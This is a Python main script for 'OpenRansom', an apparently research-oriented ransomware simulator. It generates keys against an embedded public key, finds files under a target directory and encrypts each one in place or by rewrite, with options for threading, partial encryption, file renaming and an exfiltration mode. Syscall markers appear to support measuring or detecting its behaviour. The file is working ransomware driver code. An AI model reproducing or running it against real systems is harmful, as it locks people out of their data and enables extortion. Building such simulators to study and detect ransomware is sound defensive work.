#!/usr/bin/python3
import os
import argparse
import os
import time
from datetime import datetime

import discover
import sysmark
import fio
import crypto

EMBEDDED_PUB="2e0e6e73cc72a5bbac9ca8bc2d4487ed9588d9fd885c22db18c3e9ce7e959315"

def get_parser():
    parser = argparse.ArgumentParser(description='OpenRansom')
    parser.add_argument('-asym', '--asymmetric', help='Key Gen Algorithm', default="x25519")
    parser.add_argument('-sym', '--symmetric', help='Crypto Algorithm', default="AES")
    parser.add_argument('-k', '--key-len', help='Symmetric Key Length', default="128")
    parser.add_argument('-m', '--mode', help='AES mode', default="CTR")
    parser.add_argument('-w', '--write', help='Write method', default="O")
    parser.add_argument('-d', '--dir', help='Add the path to encrypt/decrypt', default='/mnt/home/Data')
    parser.add_argument('-e', '--exfil', help='Exfiltrate files synchronous to server', default="none")
    parser.add_argument('-ext', '--extension', help='Rename file with extension', default=None)
    parser.add_argument('-t', '--threads', help='Rapid encryption using parallel threads', default=1)
    parser.add_argument('-p', '--partial', help='Rapid encryption by partial encrypt', default=100)
    parser.add_argument('-v', '--verbose', help='Add custom syscalls', default=0)
    return parser

def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    asym = args['asymmetric']
    sym = args['symmetric']
    keylen = args['key_len']
    AES_mode = args['mode']
    write_mode = args['write']
    currentDir = args['dir']
    exfil = args['exfil']
    pid = int(args['verbose'])
    crypt_ext = True if args['extension'] == "default" else False
    threads = int(args['threads'])
    partial = int(args['partial'])
    
    match write_mode:
        case "O":
            callback = fio.encrypt_file_inplace
        case "WA":
            callback = fio.encrypt_file_writeafter
        case "WB":
            callback = fio.encrypt_file_writebefore
    
    if pid > 0:
        sysmark.invoke_syscall(pid,1)
   
    bPub, iv_bytes, secret1, aPub_bytes = crypto.key_gen(asym, sym, AES_mode, EMBEDDED_PUB)
    fio.save_secrets(iv_bytes+secret1, aPub_bytes) # Prepend CTR/IV

    #files = ["000387.txt"]
    
    if pid > 0:
        sysmark.invoke_syscall(pid,1)
    
    files = discover.discoverFiles(currentDir)
    #for f in discover.discoverFiles(currentDir):
    for f in files:
        cPriv, cPub, _ = crypto.derive_x25519_keypair()
        shared2 = crypto.generate_shared_key(cPriv, bPub)
        cipher2, _, padding = crypto.get_sym_cipher(sym, AES_mode, shared2, keylen, iv=iv_bytes)

        cPub_bytes = crypto.public_bytes(cPub)
        
        efile = callback(f, cipher2.encrypt, crypt_ext, needPad=padding) # Inplace/WriteAfter/WriteBefore
        fio.write_file_pubkey(efile, cPub_bytes)
    
    if pid > 0:
        sysmark.invoke_syscall(pid,1)

if __name__=="__main__":
    main()
